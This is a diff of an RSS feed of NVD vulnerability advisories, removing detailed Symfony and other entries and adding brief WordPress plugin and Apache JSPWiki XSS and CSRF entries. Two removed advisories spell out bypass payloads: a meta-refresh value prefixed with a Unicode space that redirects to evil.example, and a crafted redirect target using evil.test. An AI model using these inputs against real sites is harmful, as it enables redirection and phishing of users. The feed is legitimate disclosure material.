-The transport now refuses to start TLS when the server sends data right after its answer to STARTTLS, and throws a TransportException instead.</description>
+    <title>CVE-2026-135932 - NVD - CVSS Score v3.1: 8.8</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135932</link>
+    <guid isPermaLink="false">a64919c828e1e13b670ea471d9994ef3</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 8.8 | Cross-Site Request Forgery (CSRF) vulnerability in WP ManageNinja LLC FluentBoards fluent-boards allows Cross Site Request Forgery.This issue affects FluentBoards: from n/a through 2.3.0.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133756 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133756</link>
-    <guid isPermaLink="false">88f9cece291419bddfedac654e2ec71b</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | MetaRefreshAttributeSanitizer checks the URL of a &lt;meta http-equiv=&quot;refresh&quot;&gt; directive only when its content starts with a refresh time. Since the fix for CVE-2026-121373, only the ASCII whitespace of the HTML specification could come before that time. Chromium-based browsers also skip a vertical tab and the Unicode spaces U+1680, U+2000 to U+200A, U+2028, U+205F and U+3000.
-
-When the time followed one of these characters, the sanitizer returned the value unchanged. Its URL wasn't checked against allowLinkHosts() and allowLinkSchemes(), and Chromium followed it:
-
-$sanitizer-&gt;sanitizeFor('head', &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;\u{3000}0;url=https://evil.example/\&quot;&gt;&quot;);
-// returned unchanged, and Chromium redirects to https://evil.example/
-
-The vertical tab is a regression of the fix for CVE-2026-121373, since the expression used before matched it. The Unicode spaces have been accepted since the sanitizer of meta refresh directives exists.
-
-This requires the configuration of CVE-2026-121373: meta elements allowed with their http-equiv and content attributes, for example with allowStaticElements(), and content sanitized with sanitizeFor('head', ...). Firefox and Safari skip only ASCII whitespace there.
-
-The sanitizer now skips controls, Unicode whitespace and invisible characters before the time, so that it checks the URL of these directives too.</description>
+    <title>CVE-2026-135936 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135936</link>
+    <guid isPermaLink="false">0b1a98a5fea99c42483aaaf8ecafa3a2</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Missing Authorization vulnerability in Groundhogg Groundhogg groundhogg allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects Groundhogg: from n/a through 4.11.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133757 - NVD - CVSS Score v4.0: 8.2</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133757</link>
-    <guid isPermaLink="false">0151f8412d80e9bdb86ebb41a1cbd106</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.2 | Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient follows redirects itself, and sends each hop as a new request through the client it decorates. Before a redirect to another origin, it removes the Authorization and Cookie headers it knows about. But the decorated client then added its own default options again. These include the auth_basic, auth_bearer and auth_ntlm credentials, and the Authorization and Cookie headers it was created with. Credentials set with withOptions() on the decorator came back the same way, since the decorator forwards them to the decorated client.
-
-These credentials were then sent to any origin that a response redirected to, for example through an open redirect on the server the application calls. The decorated client alone doesn't send them. The decorator removed the ones passed to request(), but not auth_ntlm. Since Symfony 8.1, DnsResolvingHttpClient follows redirects the same way and is affected too.
-
-With auth_ntlm, curl started the NTLM handshake with the other origin, which could answer with a challenge to get the NTLM response of the application.
-
-On a redirect to another origin, the decorator now passes empty Authorization and Cookie headers and unsets the auth_basic, auth_bearer and auth_ntlm options. The decorated client then can't add its own. Decorators between NoPrivateNetworkHttpClient and the transport, like ScopingHttpClient or CachingHttpClient, can't add theirs either.</description>
+    <title>CVE-2026-135937 - NVD - CVSS Score v3.1: 8.8</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135937</link>
+    <guid isPermaLink="false">d5a753a374bae3fab04a4a5b67042023</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 8.8 | Cross-Site Request Forgery (CSRF) vulnerability in Groundhogg Groundhogg groundhogg allows Cross Site Request Forgery.This issue affects Groundhogg: from n/a through 4.11.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133758 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133758</link>
-    <guid isPermaLink="false">807d06b246e0ac04152a683101636e25</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient prepares each request with the default options of the library. The decorator then passes all these options to the decorated client. Every option is then already set, so that client ignores its own default options.
-
-When these defaults restrict TLS trust, the restriction is lost without any error. A client created with peer_fingerprint, a private cafile or a minimum crypto_method refuses a server on its own. Once decorated, the same client connects to that server. Someone on the network path with a certificate that the system trust store accepts can then read and answer the requests. Default proxy and max_redirects options were lost the same way. Since Symfony 8.1, DnsResolvingHttpClient is affected too.
-
-This also applies to the default_options of FrameworkBundle, which configure the innermost client.
-
-The decorator now passes the options given to it, plus the ones it manages itself. The decorated client then applies its own default options again.</description>
+    <title>CVE-2026-135938 - NVD - CVSS Score v3.1: 6.5</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135938</link>
+    <guid isPermaLink="false">c8e5d934ecef0cd42dcda2dd64bfda8c</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 6.5 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Liquid Web / StellarWP Gutenberg Blocks by Kadence Blocks kadence-blocks allows Stored XSS.This issue affects Gutenberg Blocks by Kadence Blocks: from n/a through 3.9.1.2.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133759 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133759</link>
-    <guid isPermaLink="false">556b66adcbd5fe7607da663a54169a48</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | DoctrineTokenProvider keeps a copy of the previous token of a remember-me cookie. This way, concurrent requests sent with that token are still accepted for 60 seconds. The copy is stored in another row, under a series derived from the series of the cookie. Since Symfony 6.4.45, 7.4.18 and 8.1.6, a copy is stored for every series that the remember-me handler generates. Before, copies were stored only for the series created before Symfony 5.4.19, 6.0.19, 6.1.11 and 6.2.5.
-
-A cookie could use the series of the copy instead of its own series. The copy then matched as a current token, so the limit of 60 seconds didn't apply and the theft detection didn't trigger. Logging out deleted only the row of the original series, and the copy stayed.
-
-An attacker who got hold of a remember-me cookie could then keep logging in as its user after the user logged out. This works when the token was rotated at most once since the attacker got the cookie.
-
-DoctrineTokenProvider now accepts only the series formats that the remember-me handler generates, whatever the collation of the database. It also deletes the copy together with its token.</description>
+    <title>CVE-2026-135952 - NVD - CVSS Score v3.1: 6.5</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135952</link>
+    <guid isPermaLink="false">94e4e98a56a5a844e0680873a88e65a9</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 6.5 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WS Form WS Form LITE ws-form allows Stored XSS.This issue affects WS Form LITE: from n/a through 1.12.19.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133760 - NVD - CVSS Score v4.0: 8.7</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133760</link>
-    <guid isPermaLink="false">e3085c2ffd3494f80c20b49107343b79</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.7 | The fix for CVE-2026-109449 made the expression parser check the nesting level of long expressions. This check exists since Symfony 5.4.54, 6.4.48, 7.4.21 and 8.1.9. The parser builds a ?: b with the node of a used twice, and the check walked every path to every node. With nested short ternaries, the number of paths doubles at each level, so an expression of 256 bytes never finished parsing.
-
-The expression needs no variable and no function. Any code that parses or lints untrusted expressions is affected, including the ExpressionSyntax validation constraint. evaluate() and compile() parse the expression first, so they hang too.
-
-The nesting check now skips the nodes it already checked, so it takes linear time again. evaluate(), compile() and the messages of runtime errors now use the node of a once, so a is evaluated once, as in PHP.</description>
+    <title>CVE-2026-135959 - NVD - CVSS Score v3.1: 8.8</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135959</link>
+    <guid isPermaLink="false">7b2c528844ea5d400e18b9b8567a1f1a</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 8.8 | Cross-Site Request Forgery (CSRF) vulnerability in Paul Shield Security wp-simple-firewall allows Cross Site Request Forgery.This issue affects Shield Security: from n/a through 22.3.4.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133761 - NVD - CVSS Score v4.0: 8.7</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133761</link>
-    <guid isPermaLink="false">b7b62304ef08e7728282b68d89401ffc</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.7 | CsvEncoder::decode() splits each header cell on the key separator, . by default, and nests the decoded rows one level per separator, with no limit. PHP frees nested arrays recursively, so freeing data that is nested deeply enough overflows the C stack and crashes the process. With a stack of 8 MB, a CSV body of 448 KB is enough.
-
-Each row also builds all the levels of its headers again. With a deep header, a CSV body of 2 KB made of short rows allocates more than 128 MB. A body of 1 MB keeps the CPU busy for 10 seconds or more.
-
-Any code that decodes untrusted CSV with the Serializer is affected. From Symfony 7.4.0, this included every #[MapRequestPayload] argument that doesn't restrict acceptFormat, until 7.4.23 and 8.1.11 stopped decoding CSV payloads by default.
-
-CSV headers can now be nested up to 512 levels, the default depth of json_decode(). Decoding also stops when the rows go through more than 16 header levels, or create more than 4 arrays, per byte of data. A header row of up to 5 levels always fits, whatever the rows contain. Beyond these limits, decode() throws a NotEncodableValueException, which #[MapRequestPayload] turns into a 400 response.</description>
+    <title>CVE-2026-27431 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-27431</link>
+    <guid isPermaLink="false">a708a70daed55b9789ff7b6f931f2da3</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Missing Authorization vulnerability in WPTasty AWP Classifieds another-wordpress-classifieds-plugin allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects AWP Classifieds: from n/a through 4.4.10.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133762 - NVD - CVSS Score v4.0: 6.0</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133762</link>
-    <guid isPermaLink="false">902cd006dcc4de2d07f509c12873a55e</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.0 | Since Symfony 7.4.0, FrameworkBundle chooses the error renderer from the runtime mode of the application, which comes from the APP_RUNTIME_MODE env var. When this variable isn't set, the cli, phpdbg and embed SAPIs default to the CLI mode, and errors are rendered with CliErrorRenderer. This renderer dumps the whole exception, and it did so even when debug was off.
-
-HTTP workers that run under the CLI SAPI and don't set APP_RUNTIME_MODE then sent these dumps as error responses in production. They contain the messages, file paths and traces of the exceptions. Some exceptions reference the request, like the access denied errors of access_control rules. Their dump then contains the server parameters, with all the environment variables of the application.
-
-This affects, for example, the RoadRunner, Swoole and ReactPHP runners of php-runtime, and baldinof/roadrunner-bundle before 3.2.4. The worker mode of FrankenPHP sets the variable and isn't affected.
-
-The CLI renderer is now used only in debug mode.</description>
+    <title>CVE-2026-28000 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-28000</link>
+    <guid isPermaLink="false">c5333c04149877feef5bbe36c9e40764</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Missing Authorization vulnerability in WPTasty AWP Classifieds another-wordpress-classifieds-plugin allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects AWP Classifieds: from n/a through 4.4.10.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-134790 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-134790</link>
-    <guid isPermaLink="false">87e14ec0af79b18a70a9021108f7f761</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | The fix for CVE-2017-16652 restricts the redirects of HttpUtils::createRedirectResponse() to the host of the request. When framework.session.cookie_domain is set, it also allows the subdomains of that domain. To check a target, it read the host of the URL up to the first &quot;/&quot;. But browsers also end the host at &quot;\&quot;, &quot;?&quot; and &quot;#&quot;. So with the cookie domain .example.com, a target like https://evil.test?.example.com passed the check, and the browser went to evil.test.
+    <title>CVE-2026-71501 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-71501</link>
+    <guid isPermaLink="false">f6d71b168e6f50b116d407beb7d3952e</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Apache JSPWiki.
 
-Applications are exposed when framework.session.cookie_domain is set. The default success and failure handlers of form_login redirect to the _target_path or _failure_path of the request. A login link can then send the user to another site right after a successful login, for example to ask for the password again.
 
-HttpUtils now ends the host of a target where browsers do, before checking it against the allowed domains.</description>
+
+This issue affects Apache JSPWiki: through 2.12.4.
+
+
+
+Users are recommended to upgrade to version 2.12.5, which fixes the issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-134791 - NVD - CVSS Score v4.0: 8.7</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-134791</link>
-    <guid isPermaLink="false">9f2542919838dc149b1e2044230c3907</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.7 | Since Symfony 7.2, expressions can contain comments. The lexer used a regular expression to find the end of a comment. When a /* was never closed, this regular expression scanned the rest of the expression, and the lexer then went on with the next character. So each /* scanned the rest of the expression again. Linting 192 KB of /*  took 9 to 11 seconds, and 96 KB took 34 seconds without PCRE JIT.
-
-The lexer runs before the parser and its nesting limit. Any code that lints or parses untrusted expressions is affected, including the ExpressionSyntax validation constraint. A Length constraint on the same value doesn't help, since the validator runs both constraints.
-
-The lexer now uses strpos() to find the end of a comment, and a comment that is never closed throws a SyntaxError. Such expressions were already invalid. Lexing takes linear time again.</description>
+    <title>CVE-2026-71902 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-71902</link>
+    <guid isPermaLink="false">1ea3bd510c6dc5b8b47ff33ba48c2a9f</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting (XSS) in Group.jsp in Apache JSPWIKI on versions older than 2.12.5 allows attacker to execute javascript via a specially crafted url
+Users are recommended to upgrade to version 2.12.5, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-134792 - NVD - CVSS Score v4.0: 8.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-134792</link>
-    <guid isPermaLink="false">84a610080f4202558474f65c582707ca</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.3 | When the proxy option isn't set, HttpClient takes the proxy from environment variables like http_proxy or HTTP_PROXY. On web servers, it ignores HTTP_PROXY, because PHP puts the Proxy request header there (the httpoxy issue). On the CLI SAPI, it read HTTP_PROXY from $_SERVER, where PHP also puts the environment.
-
-HTTP workers that run under the CLI SAPI put the headers of each request in $_SERVER too. This is the case of spiral/roadrunner-http, which the RoadRunner runner of php-runtime uses, and of baldinof/roadrunner-bundle and php-pm. A client could then send a Proxy header to choose the proxy of the requests that the application sent while handling its request. That proxy received the full requests to http:// URLs, with their credentials, and could forge the responses. For https:// URLs, it learned the host and port through CONNECT.
-
-NativeHttpClient is affected since Symfony 4.3.0, AmpHttpClient since 5.1.0, and CurlHttpClient since 4.4.40, 5.4.7 and 6.0.7.
-
-On the CLI SAPI, HTTP_PROXY is now read from the environment with $_ENV and getenv(), never from $_SERVER. Other SAPIs still ignore it.</description>
+    <title>CVE-2026-71903 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-71903</link>
+    <guid isPermaLink="false">4b8fda3cccdb68f9a272981dc502c231</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting (XSS) in JSPWIKI in versions 2.12.4 and older. allows attacker to execute javascript via injection using the image plugin.
+Users are recommended to upgrade to version 2.12.5, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-136641 - NVD - CVSS Score v3.1: 6.8</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-136641</link>
-    <guid isPermaLink="false">c2b9f9794f8aa0f5455be983923e5f03</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 6.8 | Pydantic AI Harness's PlaywrightBrowser enforces its egress policy on HTTP requests and page WebSockets, but not on WebRTC or WebTransport connections, WebSockets opened with WebSocketStream, or the requests the browser itself sends for FedCM. A page the agent opens can make the browser send WebRTC (STUN and TURN), WebTransport and WebSocketStream traffic, and FedCM requests, to hosts and ports that the policy refuses, including under a policy that limits every request kind to an allowlist.
-
-This affects applications that use PlaywrightBrowser to open pages an attacker can influence. The traffic is each protocol's connection setup, sent to a destination the page chooses. A page can learn whether a target answers a STUN request. No response body from an ordinary internal service was readable through WebRTC, WebTransport or FedCM. A WebSocketStream is an ordinary WebSocket that the WebSocket guard does not see, opened from a page, a frame or a worker, and the page reads what the server sends, including from a private address. Chromium's Local Network Access blocks WebTransport from public pages to private addresses, but does not block WebRTC.
-
-A FedCM call (navigator.credentials.get with an identity provider) makes the browser fetch the provider's /.well-known/web-identity, config, accounts and client metadata URLs. The page chooses the config URL's path and the client ID, so it can send data to a host outside allowed_domains or listed in blocked_domains. The accounts request carries the provider's cookies from the browser profile. FedCM requires a provider origin that is HTTPS or loopback.
-
-The assumed attacker is a third party with no access to the application who controls script on a page the agent opens.
-
-Under an enforced egress policy, which is the default, pydantic-ai-harness 0.74.0 removes RTCPeerConnection, webkitRTCPeerConnection, WebTransport, WebSocketStream, IdentityCredential and IdentityProvider from every page and frame, refuses FedCM calls to navigator.credentials.get, and launches Chromium with FedCM and WebSocketStream turned off. These paths stay outside the policy: WebTransport from workers; WebSocketStream from workers in a browser reached over cdp_url; WebTransport in sandboxed iframes that Chromium runs in their own process (headless=False and cdp_url); and documents loaded before attachment under cdp_context='default'.
-
-Upgrade pydantic-ai-harness to 0.74.0 or later. For the paths the upgrade leaves open, and until you upgrade, run the browser behind a network egress filter that also covers UDP, or do not open untrusted URLs with PlaywrightBrowser.</description>
-    <category>NVD</category>
-    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
-  </item>
-  <item>
-    <title>CVE-2026-136706 - NVD - CVSS Score v4.0: 9.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-136706</link>
-    <guid isPermaLink="false">82d7c934d6a0bd7f5e9789f3e07768a3</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 9.3 | This vulnerability exists in the DIGIT Platform due to improper neutralization of user supplied input while constructing SQL queries and execution in the affected User and Access Control Service components. An unauthenticated remote attacker could exploit this vulnerability by sending specially crafted input through the affected API endpoint to the targeted system.
-
-Successful exploitation of this vulnerability could allow the attacker to execute arbitrary SQL queries, potentially resulting in unauthorized disclosure, modification or deletion of database information on the targeted system.</description>
-    <category>NVD</category>
-    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
-  </item>
-  <item>
-    <title>CVE-2026-78105 - NVD - CVSS: não informado</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78105</link>
-    <guid isPermaLink="false">e6a033fbe7966ad349d36cbe7bb2db22</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting/injection in WYSIWYG editor in Apache JSPWIKI from 2.10 through 3.0.0 on all platforms allows attacker to inject html or javascript outside of the textarea bounds used for rendering.
+    <title>CVE-2026-78089 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78089</link>
+    <guid isPermaLink="false">27677b5af277fa13e3563601d55736ca</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Injection/Cross Site Scripting potential in SvnStyleDiffProvider in Apache JSPWIKI 3.0.0 on all platforms allows improperly formatted content to render within the browser, potentially exposing javascript based exploits. 
 Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-78108 - NVD - CVSS: não informado</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78108</link>
-    <guid isPermaLink="false">da2f7347bbc3e9ebd2d41e787ba6c63a</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Resource Exhaustion in Tika Search provider in Apache JSPWIKI versions 2.11.0.M7 through 3.0.0 on all platforms allows attackers to upload specifically crafted attachments that expiolt a known issue with Tika that leads to resource (system memory) exhaustion, causing denial of service.
-Users are recommended to either stop using the Tika provider in favor of another available provider or ti upgrade to version 3.0.1, which fixes this issue.</description>
+    <title>CVE-2026-78090 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78090</link>
+    <guid isPermaLink="false">c2db91747fb687610095858a3a06951f</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting/Injection in Apache JSPWIKI versions 2.X to 3.0.0 inclusive on all platforms allows an attacker to potentially render unescaped inputs to the browser when creating a new page.
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-78110 - NVD - CVSS: não informado</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78110</link>
-    <guid isPermaLink="false">9225690cac23456eb49f2745e968e124</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cascading Style Sheet injection in Image plugin in Apache JSPWIKI versions 2.1.4 through 3.0.0 on all platforms allows an authenticated attacker to edit an page and fool users into clickjacking/phishing attacks.
+    <title>CVE-2026-78091 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78091</link>
+    <guid isPermaLink="false">4b4ca280545aef415529e6ec7c8f2f2e</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site scripting/injection in ReferringUndefinedPagesPlugin in Apache JSPWIKI on all platforms allows specific fields in the plugin to render unescaped content to the browser.
+Users are recommended to upgrade to version 3.0.1 which fixes this issue.</description>
+    <category>NVD</category>
+    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
+  </item>
+  <item>
+    <title>CVE-2026-78092 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78092</link>
+    <guid isPermaLink="false">b8509c065afb7f2ea817325d39ac45f0</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Stored XSS/Cross Site Scripting/Injection in the attachment servlet in Apache JSPWIKI on all platforms, all previous versions allows an attacker to upload a malicious HTML file and then potentially have it rendered in browser due to lax rules of rendering inline vs a file download.
 
 
 
@@ -470,74 +262,112 @@ Users are recommended to upgrade to version 3.0.1, which fixes this issue.</desc
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80267 - NVD - CVSS Score v3.1: 7.8</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80267</link>
-    <guid isPermaLink="false">4573030c6f55de4679b5aa35b9c2f0c6</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 7.8 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains a Use of Hard-coded Credentials vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to unauthorized access.</description>
+    <title>CVE-2026-78093 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78093</link>
+    <guid isPermaLink="false">7ccbc9de28fd28759e4bf80208001b51</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting/injection in WeblogPlugin in Apache JSPWIKI on all versions previous to 3.0.1 on all platforms allows an attack to bypass content encodingf mechanisms to render raw html or javascript onto the page.
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80269 - NVD - CVSS Score v3.1: 7.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80269</link>
-    <guid isPermaLink="false">29ee4d72ad83a2b89d62cfe71a620204</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 7.3 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an Insecure Temporary File vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to filesystem access for attacker.</description>
+    <title>CVE-2026-78094 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78094</link>
+    <guid isPermaLink="false">e32c53739ac982d93cd7dd3a06a944ff</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site scripting/injection in SampleAjaxPlugin in Apache JSPWIKI on all versions prior to 3.0.1 on all platforms allows attacker to bypass page encoding, potentially rendering raw html or javascript on the page
+
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80270 - NVD - CVSS Score v3.1: 5.1</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80270</link>
-    <guid isPermaLink="false">155cf55d31fd1ec9fff12ef34b46f4fc</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.1 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an XML Injection vulnerability. An attacker with local access could potentially exploit this vulnerability, leading to unauthorized data access or manipulation.</description>
+    <title>CVE-2026-78095 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78095</link>
+    <guid isPermaLink="false">0fbbac23df04d54455c3f31952f5249c</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting in Markdown renderer in Apache JSPWIKI 2.4 through 3.0.0 on all platforms allows attacker to bypass html encoding techniques to potentially render raw html or javascript in the browser.
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80271 - NVD - CVSS Score v3.1: 7.8</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80271</link>
-    <guid isPermaLink="false">28ca8ab502bb116856583db2cd0804af</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 7.8 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains a Use of Hard-coded Cryptographic Key vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to remote execution.</description>
+    <title>CVE-2026-78096 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-78096</link>
+    <guid isPermaLink="false">20df5a3a08ec26f7242cee652a2994f8</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting/Injection in PageTab.jsp in Apache JSPWIKI versions 2.10 through 3.0.0 on all platforms allows an attacker to make a specially crafted wiki page and share a custom URL that bypasses html and javascript encoding techniques, enabling render and execution in the browser.
+
+
+
+
+Users are recommended to upgrade to version 3.0.1, which fixes this issue.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-80272 - NVD - CVSS Score v3.1: 5.1</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80272</link>
-    <guid isPermaLink="false">f08696364e731ddcc45b6c814f31f64a</guid>
